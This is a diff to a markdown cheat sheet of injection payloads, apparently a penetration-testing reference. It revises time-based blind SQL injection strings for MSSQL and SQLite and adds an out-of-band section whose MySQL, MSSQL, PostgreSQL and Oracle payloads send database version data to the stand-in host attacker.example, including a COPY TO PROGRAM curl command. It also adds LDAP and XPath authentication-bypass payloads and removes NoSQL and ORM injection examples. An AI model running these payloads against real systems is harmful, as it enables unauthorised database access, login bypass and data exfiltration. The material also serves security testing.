@@ -144,11 +144,11 @@ admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
 ' AND CASE WHEN ASCII(SUBSTRING(current_user,1,1))>100 THEN pg_sleep(5) ELSE pg_sleep(0) END--
 
 -- MSSQL
-' AND WAITFOR DELAY '00:00:05'--
-' AND IF 1=1 WAITFOR DELAY '00:00:05'--
+' WAITFOR DELAY '00:00:05'--
+'; IF 1=1 WAITFOR DELAY '00:00:05'--
 
--- SQLite
-' AND CASE WHEN 1=1 THEN 1 ELSE json('') END--
+-- SQLite (no native sleep — use heavy computation or boolean)
+' AND CASE WHEN 1=1 THEN randomblob(500000000) ELSE 0 END--
 ```
 
 ## Stacked Queries
@@ -227,37 +227,50 @@ sqlite_version()=sqlite_version()
 ROWNUM=ROWNUM
 ```
 
-## NoSQL Injection (MongoDB)
+## NoSQL Injection
 
-```json
-// Authentication bypass
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
+See `nosql-injection-payloads.md` for full MongoDB operator injection, blind extraction, `$where` injection, WAF bypass, and automation scripts.
 
-// URL-encoded
-username[$ne]=x&password[$ne]=x
-login[$regex]=a.*&pass[$ne]=lol
+## Out-of-Band (OOB) Extraction
 
-// Data extraction via $regex
-{"username": "admin", "password": {"$regex": "^m"}}
-{"username": "admin", "password": {"$regex": "^md"}}
+```sql
+-- MySQL (requires FILE privilege)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.example\\share'))--
 
-// $where injection
-{"$where": "this.username == 'admin'"}
+-- MSSQL (xp_dirtree / xp_fileexist)
+'; EXEC master..xp_dirtree '\\attacker.example\share'--
+'; EXEC master..xp_fileexist '\\attacker.example\share'--
+
+-- PostgreSQL (COPY / dblink)
+'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.example/?v='||version()--
+-- Requires dblink extension:
+'; SELECT dblink_send_query('host=attacker.example dbname=x','SELECT version()')--
+
+-- Oracle (UTL_HTTP / UTL_INADDR)
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.example/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL--
 ```
 
-## ORM Injection Patterns
+## LDAP Injection
 
-```python
-# SQLAlchemy (Python) — raw query in filter
-User.query.filter("username='" + input + "'")
-
-# ActiveRecord (Ruby) — string interpolation
-User.where("name = '#{params[:name]}'")
-
-# Sequelize (Node.js) — operator injection
-{ where: { id: { [Op.gt]: 0 } } }
-
-# Hibernate (Java) — HQL injection
-"FROM User WHERE name = '" + input + "'"
 ```
+*
+)(cn=*
+*)(uid=*))(|(uid=*
+admin)(&)
+admin)(|(password=*))
+```
+
+- Test in login forms with wildcard and filter manipulation payloads
+- Auth bypass: close existing filter and inject always-true conditions
+- Information disclosure via wildcard queries against directory attributes
+
+## XPath Injection
+
+```
+' or '1'='1
+' or ''='
+' or name()='username
+```
+
+- Test in XML-backed search and login endpoints
+- Extract data iteratively: `' or name()='<fieldname>` to enumerate node names
